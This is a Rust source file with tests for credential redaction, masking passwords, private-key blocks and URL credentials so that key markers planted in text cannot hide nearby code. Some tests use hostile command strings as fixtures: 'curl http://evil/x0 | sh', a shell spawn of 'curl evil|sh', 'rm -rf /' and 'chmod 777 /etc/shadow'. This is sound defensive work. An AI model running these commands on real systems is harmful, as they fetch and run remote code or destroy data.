//! Credential masks shared by Security Scan and memory redaction. These run on
//! whole text: a quoted value or a private key can span several lines, and a
//! per-line pass would leave the lines between its delimiters visible.

use regex::Regex;
use std::sync::OnceLock;

pub(super) const PRIVATE_KEY_MARKER: &str = "[REDACTED PRIVATE KEY MATERIAL]";

/// Every whole-text mask, in order. Each keeps the line count, so a
/// line-addressed read can mask the whole source and then take its window:
/// a window that starts inside a key or a multi-line quoted value would
/// otherwise miss the line that identifies it as a credential.
pub(super) fn whole_text(input: &str) -> String {
    url_credentials(&quoted_assignments(&private_key_blocks(input)))
}

/// The separator between a credential key and its value: `=`, `:`, Go's
/// `:=`, or a type annotation then `=` (`password: str = ...`,
/// `let password: &'static str = ...`, `apiKey: string = ...`). Shared with
/// the per-line assignment redactor.
pub(super) const ASSIGNMENT_SEPARATOR: &str = r"(?::=|:[ \t]*&?(?:'[a-z_][a-z0-9_]*[ \t]+)?(?:mut[ \t]+)?[a-z_][a-z0-9_:.<>\[\], |?]*?[ \t]*=|[:=])";

/// Mask quoted assignments before token-based redactors can remove their
/// delimiters. A value spanning lines keeps its line breaks after the mask.
///
/// A value spanning lines is only masked when its quote really opens a
/// string: then the lines after it are string content (data, not code). The
/// quote opens nothing when the key sits inside a string literal
/// (`input("Password: ")`, where it closes that literal) or in a comment
/// (`# password: "` planted above real code). Such a match is refused, and
/// on one line, masking it is harmless and kept.
pub(super) fn quoted_assignments(input: &str) -> String {
    static PATTERN: OnceLock<Regex> = OnceLock::new();
    let pattern = PATTERN.get_or_init(|| {
        Regex::new(&format!(
            r#"(?i)(?P<key>[a-z0-9_.-]*(?:api[_-]?key|client[_-]?secret|access[_-]?token|secret|password|passwd|authorization|private[_-]?key|token)[a-z0-9_.-]*)(?P<gap>[\s"']*){ASSIGNMENT_SEPARATOR}\s*(?:"""[\s\S]*?(?:"""|$)|'''[\s\S]*?(?:'''|$)|"(?:\\[\s\S]|[^"\\])*(?:"|\\?$)|'(?:\\[\s\S]|[^'\\])*(?:'|\\?$)|`(?:\\[\s\S]|[^`\\])*(?:`|\\?$))"#,
        ))
        .expect("fixed quoted credential assignment pattern")
    });
    let mut out = String::with_capacity(input.len());
    let mut copied = 0;
    let mut from = 0;
    while let Some(captures) = pattern.captures_at(input, from) {
        let (Some(whole), Some(key)) = (captures.get(0), captures.name("key")) else {
            break;
        };
        let line_start = input[..key.start()].rfind('\n').map_or(0, |at| at + 1);
        let prefix = scan_prefix(&input[line_start..key.start()]);
        let inside_literal = prefix
            .open_quote
            .is_some_and(|quote| !captures["gap"].contains(quote));
        if (inside_literal || prefix.comment) && whole.as_str().contains('\n') {
            // Mask only to the end of this line (a value written there is
            // still hidden), then rescan from the next line, so a real
            // assignment the bogus match would have swallowed is found.
            let line_end = whole.start() + whole.as_str().find('\n').unwrap_or(whole.len());
            let line_end = if input[..line_end].ends_with('\r') {
                line_end - 1
            } else {
                line_end
            };
            out.push_str(&input[copied..whole.start()]);
            out.push_str("[REDACTED]");
            copied = line_end;
            from = line_end;
            continue;
        }
        out.push_str(&input[copied..whole.start()]);
        out.push_str("[REDACTED]");
        for (index, _) in whole.as_str().match_indices('\n') {
            let crlf = whole.as_str()[..index].ends_with('\r');
            out.push_str(if crlf { "\r\n" } else { "\n" });
        }
        copied = whole.end();
        from = whole.end();
    }
    out.push_str(&input[copied..]);
    out
}

/// What the text before a key on its line says about the key.
struct LinePrefix {
    /// The quote of a string literal still open at the end, if any.
    open_quote: Option<char>,
    /// A comment marker outside any string (`#`, `//`, `/*`, `--`, `<!--`),
    /// or a line that continues a block comment (` * ...`) or is an INI or
    /// TeX comment (`;`, `%`).
    comment: bool,
}

fn scan_prefix(prefix: &str) -> LinePrefix {
    let mut open = None;
    let mut escaped = false;
    let mut comment = matches!(prefix.trim_start().chars().next(), Some('*' | ';' | '%'));
    let mut previous = '\0';
    for ch in prefix.chars() {
        match open {
            Some(_) if escaped => escaped = false,
            Some(_) if ch == '\\' => escaped = true,
            Some(quote) if ch == quote => open = None,
            Some(_) => {}
            None if matches!(ch, '"' | '\'' | '`') => open = Some(ch),
            None => {
                if ch == '#'
                    || (previous == '/' && matches!(ch, '/' | '*'))
                    || (previous == '-' && ch == '-')
                    || (previous == '<' && ch == '!')
                {
                    comment = true;
                }
            }
        }
        previous = ch;
    }
    LinePrefix {
        open_quote: open,
        comment,
    }
}

/// Mask private key material. Line count and terminators are preserved so
/// line-addressed reads of the masked text still line up with the source.
///
/// Only key text is replaced, never a whole line of code:
/// - an armor marker (`-----BEGIN ... PRIVATE KEY-----`) is replaced in
///   place, and key-like base64 between markers on the same line is masked,
///   so code sharing a line with a marker stays visible;
/// - inside a block (or a PuTTY body) a body line is replaced only when it
///   is one unbroken base64 token, or nothing but quoted base64 string
///   fragments, of at least [`KEY_LINE_MIN`] characters (or any length right
///   before the closing marker, where the short final line sits);
/// - a line that embeds key text in code (`pem += "MIIE...";`) keeps the
///   block open and has only those base64 runs masked;
/// - any other line ends the block.
///
/// Code with words separated by spaces (`rm -rf /`, `x = y + 1`) is never a
/// body line, so a planted or unterminated marker cannot hide it.
pub(super) fn private_key_blocks(input: &str) -> String {
    static PUTTY: OnceLock<Regex> = OnceLock::new();
    let putty = PUTTY.get_or_init(|| {
        Regex::new(r"(?i)\bPrivate-Lines:\s*(\d+)").expect("fixed PuTTY key pattern")
    });
    let marker = armor_marker();
    let lines: Vec<&str> = input.split_inclusive('\n').collect();
    // Whether a line's first armor marker is an END marker.
    let closes = |line: &str| {
        marker
            .captures(line)
            .is_some_and(|captures| captures[1].eq_ignore_ascii_case("END"))
    };
    let mut out = String::with_capacity(input.len());
    let mut in_block = false;
    // PuTTY keys have no armor: `Private-Lines: N` precedes N body lines.
    let mut putty_lines = 0usize;
    for (index, line) in lines.iter().enumerate() {
        let content = line.trim_end_matches(['\n', '\r']);
        let ending = &line[content.len()..];
        // Every line updates both trackers, masked or not, so one format's
        // body can never hide the other's opening marker.
        let putty_header = putty
            .captures(content)
            .map(|count| count[1].parse().unwrap_or(usize::MAX));
        let inside = in_block || putty_lines > 0;
        let final_line =
            (in_block && lines.get(index + 1).is_some_and(|next| closes(next))) || putty_lines == 1;
        if marker.is_match(content) {
            // Each segment is masked according to whether it lies inside a
            // block; the markers themselves are always replaced.
            let mut open = in_block;
            let mut copied = 0;
            for captures in marker.captures_iter(content) {
                let Some(found) = captures.get(0) else {
                    continue;
                };
                let segment = &content[copied..found.start()];
                out.push_str(&if open {
                    mask_key_runs(segment, 4)
                } else {
                    segment.to_string()
                });
                out.push_str(PRIVATE_KEY_MARKER);
                open = captures[1].eq_ignore_ascii_case("BEGIN");
                copied = found.end();
            }
            let tail = &content[copied..];
            out.push_str(&if open {
                mask_key_runs(tail, 4)
            } else {
                tail.to_string()
            });
            out.push_str(ending);
            in_block = open;
        } else if inside && key_material_line(content, final_line) {
            out.push_str(PRIVATE_KEY_MARKER);
            out.push_str(ending);
        } else if inside && has_key_run(content, final_line) {
            out.push_str(&mask_key_runs(content, key_run_min(final_line)));
            out.push_str(ending);
        } else {
            if inside {
                in_block = false;
                putty_lines = 0;
            }
            out.push_str(line);
        }
        putty_lines = putty_lines.saturating_sub(1);
        if let Some(count) = putty_header {
            putty_lines = putty_lines.max(count);
        }
    }
    out
}

/// `-----BEGIN RSA PRIVATE KEY-----`, `---- END SSH2 ENCRYPTED PRIVATE KEY
/// ----`, `-----BEGIN PGP PRIVATE KEY BLOCK-----`. PEM and OpenSSH use five
/// dashes, SSH2 four and spaces. The key type between the words is free text
/// (`X-ED25519`, tabs), but bounded so prose that merely says "begin ...
/// private key" is not armor.
fn armor_marker() -> &'static Regex {
    static MARKER: OnceLock<Regex> = OnceLock::new();
    MARKER.get_or_init(|| {
        Regex::new(r"(?i)-{3,}\s*(BEGIN|END)\b[^\r\n]{0,40}?PRIVATE\s+KEY(?:\s+BLOCK)?[ \t]*-*")
            .expect("fixed private key marker pattern")
    })
}

/// Shortest body line taken as key text on its own. PEM and PuTTY bodies
/// wrap at 64 characters, OpenSSH at 70 and SSH2 at up to 72; only the last
/// line is shorter, and that one is recognised by the closing marker after it.
const KEY_LINE_MIN: usize = 40;

fn key_run_min(final_line: bool) -> usize {
    if final_line {
        4
    } else {
        KEY_LINE_MIN
    }
}

fn base64_run() -> &'static Regex {
    static RUN: OnceLock<Regex> = OnceLock::new();
    RUN.get_or_init(|| Regex::new(r"[A-Za-z0-9+/]{4,}={0,2}").expect("fixed base64 run pattern"))
}

fn has_key_run(text: &str, final_line: bool) -> bool {
    let min = key_run_min(final_line);
    base64_run()
        .find_iter(text)
        .any(|run| run.len() >= min && key_like(run.as_str()))
}

/// Replace the key-like base64 runs of at least `min` characters.
fn mask_key_runs(text: &str, min: usize) -> String {
    base64_run()
        .replace_all(text, |run: &regex::Captures<'_>| {
            if run[0].len() >= min && key_like(&run[0]) {
                PRIVATE_KEY_MARKER.to_string()
            } else {
                run[0].to_string()
            }
        })
        .into_owned()
}

/// Base64 key text, not a word. A 64-character body line without a digit,
/// `+`, `/` or `=` occurs about once in a million; identifiers and keywords
/// (`import`, `executeMaliciousPayload`) almost always lack them, so a
/// planted marker cannot pass ordinary code off as key material.
fn key_like(text: &str) -> bool {
    text.bytes()
        .any(|byte| byte.is_ascii_digit() || matches!(byte, b'+' | b'/' | b'='))
}

/// A line that can belong to a key body: a PEM/PGP/SSH2 armor header, a
/// blank line, or key text written one of two ways:
/// - one unbroken token, optionally quoted, escaped (`\n`, a trailing `\`)
///   or followed by `,`, `;` or a concatenating `+`;
/// - several complete quoted string fragments (`"MIIE" "abcd" +`).
///
/// Spaces inside unquoted text mean code, never key text.
fn key_material_line(content: &str, final_line: bool) -> bool {
    static HEADER: OnceLock<Regex> = OnceLock::new();
    let header = HEADER.get_or_init(|| {
        Regex::new(
            r"(?i)^(?:proc-type|dek-info|comment|version|hash|charset|subject|x-[a-z0-9-]+):",
        )
        .expect("fixed armor header pattern")
    });
    let trimmed = content.trim();
    if header.is_match(trimmed.trim_start_matches(['"', '\'', '`'])) {
        return true;
    }
    let core = trimmed
        .trim_start_matches(|ch: char| ch == '+' || ch.is_whitespace())
        .trim_end_matches(|ch: char| matches!(ch, ',' | ';' | '+' | '\\') || ch.is_whitespace());
    let tokens: Vec<&str> = core
        .split_whitespace()
        .filter(|token| *token != "+")
        .collect();
    let mut body = String::new();
    for token in &tokens {
        let inner = if tokens.len() == 1 {
            token.trim_matches(['"', '\'', '`'])
        } else {
            let Some(inner) = quoted_fragment(token) else {
                return false;
            };
            inner
        };
        body.push_str(&inner.replace("\\n", "").replace("\\r", ""));
    }
    body.is_empty()
        || (body.bytes().all(|byte| {
            byte.is_ascii_alphanumeric() || matches!(byte, b'+' | b'/' | b'=' | b'-' | b'_')
        }) && key_like(&body)
            && body.len() >= key_run_min(final_line))
}

/// The text of a token that is one complete string literal.
fn quoted_fragment(token: &str) -> Option<&str> {
    let quote = token
        .chars()
        .next()
        .filter(|ch| matches!(ch, '"' | '\'' | '`'))?;
    (token.len() >= 2 && token.ends_with(quote)).then(|| &token[1..token.len() - 1])
}

/// Mask the password in `scheme://user:password@host` for any URL scheme:
/// database, cache and broker URLs carry credentials the same way HTTP does.
///
/// Passwords hold unencoded `@`, `/`, `#`, `?` and quotes in practice, so the
/// password runs from `user:` to the last `@` before the first `/`, `?` or
/// `#` that follows the first `@`. `host:8443/...` (digits, then a delimiter,
/// before any `@`) is a port, not userinfo: `https://h:8443/u?email=a@b`
/// keeps its host. Scanning continues after each URL, so a second URL in the
/// same token is still masked.
///
/// One forward pass with no recursion: the cursor only advances, and the next
/// `@`, delimiter and whitespace are each found once and reused until passed,
/// so hostile input (a long token of repeated `a://u:`) costs linear time.
pub(super) fn url_credentials(input: &str) -> String {
    static PATTERN: OnceLock<Regex> = OnceLock::new();
    let pattern = PATTERN.get_or_init(|| {
        // The username may hold an unencoded `@` (`alerts@corp.com`, as SMTP
        // and Atlassian URLs carry it).
        Regex::new(r"(?i)\b[a-z][a-z0-9+.-]*://[^\s/:?#]*:").expect("fixed URL credential pattern")
    });
    // Next `@` and next whitespace at or after a position, found once and
    // reused until the cursor passes them, so no byte is searched twice.
    fn next_from(
        input: &str,
        from: usize,
        cached: &mut Option<usize>,
        find: fn(&str) -> Option<usize>,
    ) -> usize {
        if cached.is_none_or(|at| at < from) {
            *cached = Some(find(&input[from..]).map_or(input.len(), |offset| from + offset));
        }
        cached.unwrap_or(input.len())
    }
    let mut next_at = None;
    let mut next_space = None;
    let mut next_delimiter = None;
    let mut out = String::with_capacity(input.len());
    let mut cursor = 0;
    while let Some(found) = pattern.find_at(input, cursor) {
        let rest_start = found.end();
        let space = next_from(input, rest_start, &mut next_space, |s| {
            s.find(char::is_whitespace)
        });
        // No length cap: a password longer than any window would leak.
        let rest_end = space;
        let rest = &input[rest_start..rest_end];
        let find_delimiter: fn(&str) -> Option<usize> = |s| s.find(['/', '?', '#']);
        let relative = |at: usize| {
            Some(at)
                .filter(|at| *at < rest_end)
                .map(|at| at - rest_start)
        };
        let delimiter = relative(next_from(
            input,
            rest_start,
            &mut next_delimiter,
            find_delimiter,
        ));
        let first_at = relative(next_from(input, rest_start, &mut next_at, |s| s.find('@')));
        let port = delimiter.is_some_and(|end| {
            end > 0
                && first_at.is_none_or(|at| end < at)
                && rest[..end].bytes().all(|byte| byte.is_ascii_digit())
                // `h:8443/u@x` and `user:2024/abc@host` read the same. The
                // `@` is only path text when it starts a segment (`/@scope`)
                // or another delimiter comes before it (`/users?e=a@b`);
                // otherwise the digits may open a password, so fail closed.
                && first_at.is_none_or(|at| {
                    rest.as_bytes()[end] != b'/'
                        || at == end + 1
                        || rest[end + 1..at].contains(['/', '?', '#'])
                })
        });
        match first_at {
            Some(first_at) if !port => {
                let authority_end = relative(next_from(
                    input,
                    rest_start + first_at,
                    &mut next_delimiter,
                    find_delimiter,
                ))
                .unwrap_or(rest.len());
                let last_at = rest[..authority_end].rfind('@').unwrap_or(first_at);
                let scheme_end = input[found.start()..].find("://").map_or(0, |at| at + 3);
                out.push_str(&input[cursor..found.start() + scheme_end]);
                out.push_str("[REDACTED]");
                // Resume at the `@`: the host and anything after it are kept
                // and scanned for further URLs.
                cursor = rest_start + last_at;
            }
            _ => {
                out.push_str(&input[cursor..rest_start]);
                cursor = rest_start;
            }
        }
    }
    out.push_str(&input[cursor..]);
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    const BODY: &str = "MIIEfixture0FIXTURE1fixture2FIXTURE3fixture4FIXTURE5abcd";

    #[test]
    fn private_key_blocks_mask_every_line_and_keep_line_numbers() {
        for kind in [
            "RSA PRIVATE KEY",
            "EC PRIVATE KEY",
            "OPENSSH PRIVATE KEY",
            "PRIVATE KEY",
            "ENCRYPTED PRIVATE KEY",
        ] {
            let input = format!(
                "before\r\nconst KEY: &str = \"\\\n-----BEGIN {kind}-----\n{BODY}\n{BODY}\n-----END {kind}-----\";\nafter\n"
            );
            let output = private_key_blocks(&input);
            assert!(!output.contains(BODY), "{kind}: {output}");
            assert_eq!(output.lines().count(), input.lines().count(), "{kind}");
            assert!(output.starts_with("before\r\n"), "{output}");
            assert!(output.ends_with("after\n"), "{output}");
        }
    }

    #[test]
    fn private_key_blocks_fail_closed_and_handle_one_line_keys() {
        let unterminated = format!("-----BEGIN PRIVATE KEY-----\n{BODY}\n{BODY}");
        assert!(!private_key_blocks(&unterminated).contains(BODY));

        let one_line = format!(
            "let key = \"-----BEGIN PRIVATE KEY-----\\n{BODY}\\n-----END PRIVATE KEY-----\";\nvisible\n"
        );
        let output = private_key_blocks(&one_line);
        assert!(!output.contains(BODY));
        assert!(output.ends_with("visible\n"), "{output}");

        let prose = "// rotate the private key yearly\nvisible\n";
        assert_eq!(private_key_blocks(prose), prose);
        let prose = "// BEGIN by loading the private key, END by dropping it\nvisible\n";
        assert_eq!(private_key_blocks(prose), prose);
    }

    #[test]
    fn ssh2_and_putty_private_keys_are_masked() {
        let ssh2 = format!(
            "---- BEGIN SSH2 ENCRYPTED PRIVATE KEY ----\nComment: \"fixture\"\n{BODY}\n---- END SSH2 ENCRYPTED PRIVATE KEY ----\nvisible\n"
        );
        let output = private_key_blocks(&ssh2);
        assert!(!output.contains(BODY), "{output}");
        assert!(output.ends_with("visible\n"), "{output}");

        let putty = format!(
            "PuTTY-User-Key-File-3: ssh-ed25519\nPublic-Lines: 1\nAAAApublic\nPrivate-Lines: 2\n{BODY}\n{BODY}\nPrivate-MAC: fixture\n"
        );
        let output = private_key_blocks(&putty);
        assert!(!output.contains(BODY), "{output}");
        assert!(
            output.contains("AAAApublic") && output.contains("Private-MAC"),
            "{output}"
        );
        assert_eq!(output.lines().count(), putty.lines().count());
    }

    #[test]
    fn one_key_format_never_hides_another_ones_marker() {
        // A PuTTY body count that covers a PEM BEGIN line must still open the
        // PEM block, and a PEM block must still see a PuTTY header.
        let mixed = format!(
            "Private-Lines: 1\n-----BEGIN PRIVATE KEY-----\n{BODY}\n{BODY}\n-----END PRIVATE KEY-----\nvisible\n"
        );
        let output = private_key_blocks(&mixed);
        assert!(!output.contains(BODY), "{output}");
        assert!(output.ends_with("visible\n"), "{output}");

        let mixed = format!(
            "-----BEGIN PRIVATE KEY-----\nPrivate-Lines: 3\n-----END PRIVATE KEY-----\n{BODY}\n{BODY}\nvisible\n"
        );
        let output = private_key_blocks(&mixed);
        assert!(!output.contains(BODY), "{output}");
        assert!(output.ends_with("visible\n"), "{output}");
    }

    #[test]
    fn free_text_key_types_are_armor() {
        for begin in [
            "-----BEGIN X-ED25519 PRIVATE KEY-----",
            "-----BEGIN\tRSA PRIVATE KEY-----",
            "-----BEGIN PGP PRIVATE KEY BLOCK-----",
        ] {
            let input = format!("{begin}\n{BODY}\n-----END PRIVATE KEY-----\nvisible\n");
            let output = private_key_blocks(&input);
            assert!(!output.contains(BODY), "{begin}: {output}");
            assert!(output.ends_with("visible\n"), "{output}");
        }
    }

    #[test]
    fn multi_line_quoted_values_keep_their_line_count() {
        for input in [
            "password = \"fixture first\nfixture second\nfixture third\"\nvisible\n",
            "password = \"fixture first\r\nfixture second\"\r\nvisible\r\n",
        ] {
            let output = whole_text(input);
            assert!(!output.contains("fixture"), "{output:?}");
            assert_eq!(output.lines().count(), input.lines().count(), "{output:?}");
            assert!(output.contains("visible"), "{output:?}");
        }
    }

    #[test]
    fn text_around_a_begin_marker_never_closes_the_block() {
        // "END" in other text on the BEGIN line (APPENDED, ENDPOINT, pem_end)
        // must not end the block before the body.
        for begin in [
            "-----BEGIN RSA PRIVATE KEY----- // appended by vendor",
            "let pem_end = \"-----BEGIN PRIVATE KEY-----\\",
            "-----BEGIN EC PRIVATE KEY----- endpoint key",
            "-----END PRIVATE KEY----- -----BEGIN PRIVATE KEY-----",
            "-----begin openssh private key-----",
        ] {
            let input = format!("{begin}\n{BODY}\n{BODY}\n-----END PRIVATE KEY-----\nvisible\n");
            let output = private_key_blocks(&input);
            assert!(!output.contains(BODY), "{begin}: {output}");
            assert!(output.ends_with("visible\n"), "{begin}: {output}");
        }
    }

    #[test]
    fn url_credentials_cover_every_scheme_and_keep_the_host() {
        for url in [
            "postgres://admin:fixture-sensitive@db.internal/app",
            "mysql://root:fixture-sensitive@127.0.0.1:3306/db",
            "mongodb+srv://u:fixture-sensitive@cluster.example/db",
            "redis://:fixture-sensitive@cache:6379/0",
            "amqp://guest:fixture-sensitive@broker//",
            "https://user:fixture-sensitive@example.invalid",
            // Unencoded `@` and `/` in the password.
            "postgres://admin:fixture@sensitive@db.internal/app",
            "postgres://admin:fixture'sensitive\"x@db.internal/app",
            "postgres://o'neil:fixture-sensitive@db.internal/app",
            "postgres://\"admin\":fixture-sensitive@db.internal/app",
            "DATABASE_URL=\"mysql://root:fixture-sensitive@db/app\"",
        ] {
            let output = url_credentials(url);
            assert!(!output.contains("sensitive"), "{output}");
            assert!(output.contains("[REDACTED]@"), "{output}");
            assert!(!output.contains("[REDACTED]@sensitive"), "{output}");
        }
        assert_eq!(
            url_credentials("postgres://db.internal:5432/app"),
            "postgres://db.internal:5432/app"
        );
        // Passwords with #, ?, / and @, and a second URL in the same token.
        for (url, host) in [
            (
                "postgres://u:pa#ss-sensitive@db.internal/app",
                "@db.internal/app",
            ),
            (
                "postgres://u:pa?ss-sensitive@db.internal/app",
                "@db.internal/app",
            ),
            (
                "postgres://u:pa/ss-sensitive@db.internal/app",
                "@db.internal/app",
            ),
            (
                "postgres://u:a@b-sensitive@db.internal/app?next=x@y",
                "@db.internal/app?next=x@y",
            ),
            ("a://u:p@h,b://v:q-sensitive@k", "@k"),
            ("http://h:8080/x?u=http://a:q-sensitive@b", "@b"),
        ] {
            let output = url_credentials(url);
            assert!(!output.contains("sensitive"), "{url} -> {output}");
            assert!(output.ends_with(host), "{url} -> {output}");
        }
        // An `@` in a path, query or fragment is not userinfo: host, port and
        // the code after them stay visible.
        for visible in [
            "https://api.host:8443/users?email=a@b.com",
            "http://localhost:4873/@scope/pkg",
            "u=\"http://x:1/\";var e=\"@\";run(e)",
            "https://host:443#frag@x",
        ] {
            assert_eq!(url_credentials(visible), visible);
        }
    }

    #[test]
    fn a_planted_marker_cannot_pass_code_off_as_key_text() {
        let planted = format!(
            "-----BEGIN PRIVATE KEY-----\n{BODY}\nrun(executeMaliciousPayload); // {BODY}\nimport os\nexecuteMaliciousPayload\nvisible();\n"
        );
        let output = private_key_blocks(&planted);
        // Key text is masked, the identifier on the same line is not, and
        // letters-only code ends the block.
        assert!(!output.contains(BODY), "{output}");
        assert!(output.contains("run(executeMaliciousPayload);"), "{output}");
        assert!(output.contains("import os"), "{output}");
        assert!(output.contains("executeMaliciousPayload\n"), "{output}");
        assert!(output.contains("visible();"), "{output}");
    }

    #[test]
    fn long_url_passwords_are_masked_whole() {
        let password = "p4ss/".repeat(1_000);
        let url = format!("postgres://admin:{password}@db.internal/app");
        let output = url_credentials(&url);
        assert_eq!(output, "postgres://[REDACTED]@db.internal/app");
    }

    #[test]
    fn url_scan_is_linear_and_never_recurses_on_hostile_tokens() {
        // 200k repeated scheme prefixes in one token: the old recursive scan
        // overflowed the stack and rescanned the token for every prefix.
        let hostile = "a://u:".repeat(200_000);
        let started = std::time::Instant::now();
        assert_eq!(url_credentials(&hostile), hostile);
        let with_at = format!("{}@host", "a://u:p".repeat(50_000));
        let output = url_credentials(&with_at);
        assert!(
            output.ends_with("@host"),
            "{}",
            &output[output.len() - 40..]
        );
        assert!(
            started.elapsed() < std::time::Duration::from_secs(5),
            "{:?}",
            started.elapsed()
        );
    }

    #[test]
    fn a_planted_or_unterminated_marker_hides_only_key_material() {
        // A BEGIN line with no END, then ordinary code: the code is visible.
        let planted = format!(
            "// -----BEGIN PRIVATE KEY-----\n{BODY}\nfn backdoor() {{ run(\"x\"); }}\nlet visible = 1;\n"
        );
        let output = private_key_blocks(&planted);
        assert!(!output.contains(BODY), "{output}");
        assert!(
            output.contains("fn backdoor()") && output.contains("let visible"),
            "{output}"
        );

        // An oversized PuTTY count ends at the first non-key line.
        let putty = format!("Private-Lines: 99999999999999999999\n{BODY}\nfn backdoor() {{}}\n");
        let output = private_key_blocks(&putty);
        assert!(!output.contains(BODY), "{output}");
        assert!(output.contains("fn backdoor()"), "{output}");

        // A body split into short string fragments on one line is key text.
        let fragments = "-----BEGIN PRIVATE KEY-----\n\"MIIEfix0\" \"tureFIX1\" \"TUREabc2\" +\n-----END PRIVATE KEY-----\nvisible();\n";
        let output = private_key_blocks(fragments);
        assert!(
            !output.contains("MIIEfix0") && !output.contains("TUREabc2"),
            "{output}"
        );
        assert!(output.contains("visible();"), "{output}");

        // Key bodies built up in code keep the block open; only the base64 is
        // masked, so the surrounding code (and padded code) stays readable.
        let built = format!(
            "-----BEGIN PRIVATE KEY-----\npem += \"{BODY}\";\nsb.append(\"{BODY}\");\nrun(\"{BODY}\"); exec(evil);\n-----END PRIVATE KEY-----\nvisible();\n"
        );
        let output = private_key_blocks(&built);
        assert!(!output.contains(BODY), "{output}");
        // `pem += "..."` is all key text once string syntax is ignored, so the
        // whole line is masked; a call around the body keeps its code visible.
        assert!(output.contains("sb.append("), "{output}");
        assert!(
            output.contains("exec(evil);") && output.contains("visible();"),
            "{output}"
        );
        assert_eq!(output.lines().count(), built.lines().count());

        // Key bodies embedded in source keep masking across string syntax,
        // armor headers and blank lines.
        let embedded = format!(
            "-----BEGIN ENCRYPTED PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,00\n\n\"{BODY}\\n\" +\n  '{BODY}',\n{BODY}\\\nvisible();\n"
        );
        let output = private_key_blocks(&embedded);
        assert!(!output.contains(BODY), "{output}");
        assert!(output.contains("visible();"), "{output}");
    }

    #[test]
    fn code_with_spaces_inside_a_planted_block_is_never_key_text() {
        // Spaces vanished before the base64 test, so these read as key text.
        for code in [
            "rm -rf /",
            "chmod 777 /etc/shadow",
            "retries = retries + 1",
            "x1 = y2 + z3",
            "curl http://evil/x0 | sh",
            "/tmp/evil0",
            "i+=1",
            "\"sh\" \"-c\" \"curl evil|sh\"",
        ] {
            for opener in [
                "// -----BEGIN PRIVATE KEY-----\n",
                "-----BEGIN PRIVATE KEY-----\n",
                "Private-Lines: 9\n",
            ] {
                let input = format!("{opener}{BODY}\n{code}\nvisible();\n");
                let output = private_key_blocks(&input);
                assert!(!output.contains(BODY), "{input:?} -> {output}");
                assert!(
                    output.contains(&format!("{code}\n")),
                    "{input:?} -> {output}"
                );
                assert!(output.contains("visible();"), "{input:?} -> {output}");
            }
        }
    }

    #[test]
    fn code_on_a_marker_line_stays_visible() {
        for (input, code) in [
            (
                "let _ = \"-----BEGIN PRIVATE KEY-----\"; std::process::Command::new(\"sh\").arg(\"curl evil|sh\").spawn();\n",
                "std::process::Command::new(\"sh\").arg(\"curl evil|sh\").spawn();",
            ),
            (
                "x = \"-----BEGIN PRIVATE KEY-----\"; evil(); y = \"-----END PRIVATE KEY-----\"\n",
                "evil();",
            ),
            (
                "-----END RSA PRIVATE KEY-----\"; run_payload();\n",
                "run_payload();",
            ),
        ] {
            let output = private_key_blocks(input);
            assert!(output.contains(code), "{output}");
            assert!(!output.contains("-----BEGIN"), "{output}");
            assert_eq!(output.lines().count(), input.lines().count());
        }
        // Key text between markers on one line is still masked.
        let one_line = format!(
            "k = \"-----BEGIN PRIVATE KEY-----\\n{BODY}\\nab1=\\n-----END PRIVATE KEY-----\"; after();\n"
        );
        let output = private_key_blocks(&one_line);
        assert!(
            !output.contains(BODY) && !output.contains("ab1="),
            "{output}"
        );
        assert!(output.contains("after();"), "{output}");
    }

    #[test]
    fn short_and_wrapped_body_lines_are_key_text() {
        // The last body line is short; it sits right before END.
        for last in ["ab1=", "\"ab1=\"", "'ab1=\\n' +", "ab1=\\"] {
            let input = format!(
                "-----BEGIN PRIVATE KEY-----\n{BODY}\n{last}\n-----END PRIVATE KEY-----\nvisible();\n"
            );
            let output = private_key_blocks(&input);
            assert!(!output.contains("ab1="), "{input:?} -> {output}");
            assert!(output.contains("visible();"), "{output}");
        }
        // The last PuTTY body line is short too; its count marks it.
        let putty = format!("Private-Lines: 2\n{BODY}\nab1=\nPrivate-MAC: x\n");
        let output = private_key_blocks(&putty);
        assert!(
            !output.contains("ab1=") && !output.contains(BODY),
            "{output}"
        );
        assert!(output.contains("Private-MAC: x"), "{output}");
    }

    #[test]
    fn typed_go_and_backtick_assignments_are_masked_whole() {
        for input in [
            "password: str = \"fixture secret phrase\"",
            "let password: &str = \"fixture secret phrase\";",
            "let password: &'static str = \"fixture secret phrase\";",
            "const apiKey: string = \"fixture secret phrase\";",
            "private val token: String? = \"fixture secret phrase\"",
            "password := \"fixture secret phrase\"",
            "const apiKey = `fixture secret phrase`;",
            "api_key = `fixture secret\nphrase`\n",
        ] {
            let output = quoted_assignments(input);
            for part in ["fixture", "secret phrase", "phrase"] {
                assert!(!output.contains(part), "{input:?} -> {output:?}");
            }
            assert_eq!(output.lines().count(), input.lines().count());
        }
        // Comparisons are not typed assignments.
        for code in ["if password == \"x\" {", "password: x != \"y\""] {
            assert_eq!(quoted_assignments(code), code);
        }
    }

    #[test]
    fn a_credential_word_inside_a_string_does_not_hide_later_lines() {
        let input = "pw = input(\"Password: \")\nos.system(evil)\nname = \"x\"\n";
        let output = whole_text(input);
        assert!(output.contains("os.system(evil)"), "{output}");
        assert!(output.contains("name = \"x\""), "{output}");
        // A real assignment the bogus match would have swallowed is masked.
        let input =
            "print(\"enter token: \")\nrun(evil)\npassword = \"fixture first\nfixture second\"\n";
        let output = whole_text(input);
        assert!(output.contains("run(evil)"), "{output}");
        assert!(!output.contains("fixture"), "{output}");
        assert_eq!(output.lines().count(), input.lines().count());
        // Quoted keys (JSON, YAML) are still keys.
        let json = "{\"password\": \"fixture first\nfixture second\"}";
        assert!(!whole_text(json).contains("fixture"));
        // A quote planted in a comment opens no string: the code under it
        // stays visible. A one-line commented secret is still masked.
        for comment in [
            "# password: \"",
            "// password = '",
            "/* api_key: `",
            " * secret = \"",
            "-- token: \"",
            "; password = \"",
            "<!-- password: \"",
        ] {
            let input = format!("{comment}\nimport os; os.system(payload)\nx = \"y\"\n");
            let output = whole_text(&input);
            assert!(output.contains("os.system(payload)"), "{comment}: {output}");
            assert_eq!(output.lines().count(), input.lines().count());
        }
        for one_line in [
            "# password: \"fixture-sensitive\"\n",
            "# password: \"fixture-sensitive\nnext_line()\nx = \"y\"\n",
        ] {
            let output = whole_text(one_line);
            assert!(!output.contains("fixture-sensitive"), "{output}");
            assert_eq!(output.lines().count(), one_line.lines().count());
        }
        assert!(
            whole_text("# password: \"fixture\nnext_line()\nx = \"y\"\n").contains("next_line()")
        );
    }

    #[test]
    fn url_usernames_with_at_and_digit_led_passwords_are_masked() {
